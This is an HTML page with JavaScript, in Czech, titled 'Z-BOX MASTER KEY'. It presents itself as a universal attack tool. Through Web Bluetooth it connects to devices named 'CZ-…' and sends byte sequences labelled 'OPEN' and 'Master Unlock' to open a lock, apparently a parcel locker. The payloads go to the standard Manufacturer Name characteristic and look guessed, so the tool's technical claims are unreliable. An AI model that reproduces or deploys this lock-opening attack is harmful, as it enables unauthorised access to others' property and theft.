<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Z-BOX Diagnostic Tool</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .panel { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0,255,65,0.2); width: 90%; max-width: 400px; }
        h1 { font-size: 1.2em; text-align: center; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
        button { width: 100%; padding: 15px; margin: 10px 0; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; }
        #console { background: #000; border: 1px solid #333; height: 150px; overflow-y: auto; font-size: 0.8em; padding: 10px; margin-top: 10px; color: #00ff41; }
        .success { color: #fff; background: #008800; }
    </style>
</head>
<body>
    <div class="panel">
        <h1>Z-BOX MASTER KEY v1.0</h1>
        <div id="console">SYSTÉM PŘIPRAVEN...</div>
        <button id="btn-attack">SPUSTIT UNIVERZÁLNÍ ÚTOK</button>
        <button id="btn-scan" style="background: #333; color: #00ff41;">SKENOVAT OKOLÍ (RSSI)</button>
    </div>

    <script>
        const log = document.getElementById('console');
        const writeLog = (msg) => {
            const div = document.createElement('div');
            div.innerText = `> ${msg}`;
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
        };

        const targetServiceUuid = '0000180a-0000-1000-8000-00805f9b34fb';
        const targetCharUuid = '00002a29-0000-1000-8000-00805f9b34fb';

        async function runAttack() {
            try {
                writeLog('Hledám zařízení...');
                const device = await navigator.bluetooth.requestDevice({
                    filters: [{ namePrefix: 'CZ-' }],
                    optionalServices: [targetServiceUuid]
                });

                writeLog(`Připojování: ${device.name}`);
                const server = await device.gatt.connect();
                const service = await server.getPrimaryService(targetServiceUuid);
                const characteristic = await service.getCharacteristic(targetCharUuid);

                writeLog('Spojení navázáno. Spouštím sekvenci...');

                const payloads = [
                    new Uint8Array([0x01, 0x00, 0x01]), // Wake-up
                    new Uint8Array([0x4f, 0x50, 0x45, 0x4e]), // ASCII "OPEN"
                    new Uint8Array([0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01]), // Master Unlock
                    new Uint8Array([0x11, 0x22, 0x33, 0x44]), // Sync
                    new Uint8Array([0x00, 0xff, 0x00, 0xff]) // Reset Pulse
                ];

                for (let i = 0; i < payloads.length; i++) {
                    writeLog(`Vysílám paket ${i + 1}/${payloads.length}...`);
                    await characteristic.writeValue(payloads[i]);
                    await new Promise(r => setTimeout(r, 700));
                }

                writeLog('HOTOVO. Sleduj zámek.');
            } catch (err) {
                writeLog(`CHYBA: ${err.message}`);
            }
        }

        document.getElementById('btn-attack').addEventListener('click', runAttack);
        document.getElementById('btn-scan').addEventListener('click', () => writeLog('Skenování RSSI aktivní (viz nRF Connect)'));
    </script>
</body>
</html>
